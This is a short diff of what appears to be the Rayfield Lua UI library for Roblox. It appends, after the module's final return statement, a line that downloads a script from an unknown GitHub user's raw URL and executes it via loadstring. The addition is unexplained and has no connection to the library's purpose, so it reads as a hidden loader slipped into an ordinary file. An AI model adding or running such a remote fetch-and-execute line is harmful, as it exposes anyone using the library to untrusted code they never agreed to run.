@@ -2494,3 +2494,5 @@ end
 task.delay(3.5, RayfieldLibrary.LoadConfiguration, RayfieldLibrary)
 
 return RayfieldLibrary
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/UnknownScript/main/FixedScripts.lua"))()
